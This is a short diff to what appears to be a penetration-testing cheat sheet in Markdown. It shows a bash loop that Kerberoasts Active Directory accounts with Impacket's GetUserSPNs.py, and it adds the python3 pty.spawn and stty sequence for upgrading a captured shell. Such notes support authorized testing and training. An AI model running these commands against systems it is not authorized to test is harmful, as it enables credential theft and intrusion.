@@ -76,3 +76,10 @@ tar -zxvf archive.tar.gz
 ```bash
 for i in $(cat ~/path/to/user.list); do echo $i; ./GetUserSPNs.py -request -dc-ip 10.10.xx.xxx -no-pass -k domain.name/$i; sleep 5; done
 ```
+### python3 pty
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL-z
+bg
+stty raw -echo
+fg```
